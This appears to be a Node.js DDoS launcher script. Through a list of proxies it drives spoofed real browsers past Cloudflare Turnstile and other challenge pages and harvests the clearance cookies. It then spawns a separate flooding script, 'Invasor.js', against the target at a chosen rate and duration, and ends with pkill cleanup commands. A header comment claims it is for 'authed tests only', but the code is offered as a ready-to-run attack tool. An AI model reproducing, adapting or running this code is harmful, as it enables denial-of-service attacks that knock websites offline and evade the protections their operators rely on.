// authed tests only i made this for cf testing i hope u will like @JsInvasor
// updated for 2026 - puppeteer-real-browser + Turnstile support
const fs = require("fs");
const { connect } = require("puppeteer-real-browser");
const async = require("async");
const { exec, spawn } = require("child_process");

const COOKIES_MAX_RETRIES = 2;

// ────────────────────────────────────────────────
// Colors & unified logging with [m85|Browser] prefix
// ────────────────────────────────────────────────
const c = {
  reset:   "\x1b[0m",
  bright:  "\x1b[1m",
  red:     "\x1b[31m",
  green:   "\x1b[32m",
  yellow:  "\x1b[33m",
  pink:    "\x1b[35m",
  cyan:    "\x1b[36m",
  white:   "\x1b[37m",
};

const PREFIX = `${c.bright}${c.cyan}[m85|Browser]${c.reset} `;

const symbols = {
  info:    "→",
  success: "✓",
  warn:    "!",
  error:   "×",
  proxy:   "→",
};

function log(type, text) {
  const symbol = symbols[type] || " ";
  let color = c.white;

  if (type === "error") color = c.red;
  if (type === "success") color = c.green;
  if (type === "warn") color = c.yellow;
  if (type === "info" || type === "proxy") color = c.cyan;
  if (type === "pink") color = c.pink;

  console.log(`${PREFIX}${color}${symbol} ${text}${c.reset}`);
}

const errorHandler = error => log("error", error);
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

if (process.argv.length < 7) {
  log("error", "Usage: node browser.js <target> <threads> <proxies.txt> <rate> <time>");
  process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3], 10);
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = parseInt(process.argv[6], 10);

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));

const readProxiesFromFile = (filePath) => {
  try {
    const data = fs.readFileSync(filePath, 'utf8');
    return data.trim().split(/\r?\n/);
  } catch (error) {
    log("error", `Error reading proxies file: ${error}`);
    return [];
  }
};

const proxies = readProxiesFromFile(proxyFile);

const userAgents = () => {
  const chromeVersions = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  ];
  return chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
};

async function detectChallenge(page, browserProxy) {
  const content = await page.content();

  // Cloudflare Turnstile challenge detection (2024-2026)
  const isTurnstile = content.includes("cf-turnstile") ||
    content.includes("challenges.cloudflare.com/turnstile") ||
    content.includes("turnstile.js");

  // Legacy challenge-platform detection
  const isLegacyChallenge = content.includes("challenge-platform") ||
    content.includes("challenge-running");

  // Managed challenge / interstitial
  const isManagedChallenge = content.includes("managed-challenge") ||
    content.includes("cf-challenge-running");

  if (isTurnstile || isLegacyChallenge || isManagedChallenge) {
    log("pink", `Challenge detected → ${browserProxy} [${isTurnstile ? "Turnstile" : isLegacyChallenge ? "Legacy" : "Managed"}]`);
    try {
      await sleep(5);

      // Try Turnstile checkbox (iframe-based)
      const turnstileFrame = page.frames().find(f =>
        f.url().includes("challenges.cloudflare.com")
      );

      if (turnstileFrame) {
        log("info", `Found Turnstile frame → ${browserProxy}`);
        try {
          // Wait for the checkbox/verify element inside the iframe
          await turnstileFrame.waitForSelector('input[type="checkbox"], .cb-lb, #challenge-stage', { timeout: 15000 });
          const checkbox = await turnstileFrame.$('input[type="checkbox"], .cb-lb');
          if (checkbox) {
            await sleep(2);
            await checkbox.click();
            log("info", `Clicked Turnstile checkbox → ${browserProxy}`);
          }
        } catch (e) {
          log("warn", `Turnstile frame interaction failed: ${e.message}`);
        }
      }

      // Fallback: try the legacy wrapper selector
      try {
        await page.waitForSelector("#challenge-stage, .cf-turnstile, body > div.main-wrapper > div > div > div > div", { timeout: 10000 });
        const challengeEl = await page.$("#challenge-stage") ||
          await page.$(".cf-turnstile") ||
          await page.$("body > div.main-wrapper > div > div > div > div");
        if (challengeEl) {
          const box = await challengeEl.boundingBox();
          if (box) {
            await page.mouse.click(box.x + 20, box.y + 20);
          }
        }
      } catch (e) {
        // selector not found, might have auto-solved
      }

      // Wait for challenge to resolve
      await sleep(10);
    } catch (error) {
      log("error", `Error in challenge detection: ${error.message}`);
    }
  } else {
    log("warn", `No challenge detected → ${browserProxy}`);
    await sleep(3);
  }
}

async function openBrowser(targetURL, browserProxy) {
  const userAgent = userAgents();
  const [proxyHost, proxyPort] = browserProxy.split(":");
  let browser;
  try {
    const result = await connect({
      headless: "auto",
      args: [
        `--proxy-server=http://${browserProxy}`,
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--ignore-certificate-errors",
        "--disable-gpu",
        "--disable-dev-shm-usage",
        "--disable-browser-side-navigation",
        `--user-agent=${userAgent}`,
      ],
      turnstile: true,
      fingerprint: true,
      connectOption: {
        defaultViewport: null,
      },
    });

    browser = result.browser;
    const page = result.page;

    page.setDefaultNavigationTimeout(60 * 1000);
    await page.goto(targetURL, { waitUntil: "domcontentloaded" });
    await detectChallenge(page, browserProxy);

    const title = await page.title();
    const cookies = await page.cookies(targetURL);

    return {
      browser,
      title,
      browserProxy,
      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
      userAgent
    };
  } catch (error) {
    log("error", `Error in openBrowser: ${error.message}`);
    if (browser) await browser.close();
    return null;
  }
}

async function startThread(targetURL, browserProxy, task, done, retries = 0) {
  if (retries >= COOKIES_MAX_RETRIES) {
    const currentTask = queue.length();
    done(null, { task, currentTask });
    return;
  }
  let browser = null;
  try {
    const response = await openBrowser(targetURL, browserProxy);
    if (!response) {
      throw new Error("Failed to open browser or retrieve response");
    }
    browser = response.browser;

    // CF challenge fail titles
    const failTitles = [
      "Just a moment...",
      "Attention Required! | Cloudflare",
      "Please Wait... | Cloudflare",
      "Checking your browser before accessing",
      "DDOS-GUARD",
    ];

    if (failTitles.some(t => response.title.includes(t))) {
      log("error", `Proxy Issue → ${response.title} - Proxy: ${response.browserProxy}`);
      if (browser) await browser.close();
      done(null, { task, currentTask: queue.length() });
      return;
    }

    const cookies = `[ Title ]: ${response.title}\n[ Proxy ]: ${response.browserProxy}\n[ Cookies ]: ${response.cookies}\n`;
    log("success", cookies);

    spawn("node", [
      "Invasor.js",
      targetURL,
      "100",
      "2",
      response.browserProxy,
      rates,
      response.cookies,
      response.userAgent
    ]);

    if (browser) await browser.close();
    done(null, { task, currentTask: queue.length() });
  } catch (error) {
    log("error", `Error in startThread: ${error.message}`);
    if (browser) await browser.close();
    await startThread(targetURL, browserProxy, task, done, retries + 1);
  }
}

const queue = async.queue(function (task, done) {
  startThread(targetURL, task.browserProxy, task, done);
}, threads);

async function main() {
  log("info", `Starting with ${proxies.length} proxies, ${threads} threads, ${duration}s duration`);

  for (const browserProxy of proxies) {
    queue.push({ browserProxy });
  }

  await sleep(duration);

  exec('pkill -f Invasor.js', (err) => {
    if (err) log("error", `Error killing Invasor.js: ${err.message}`);
  });
  exec('pkill chrome', (err) => {
    if (err) log("error", `Error killing chrome: ${err.message}`);
  });
  exec('pkill chromium', (err) => {
    if (err) log("error", `Error killing chromium: ${err.message}`);
  });
  process.exit();
}

main();
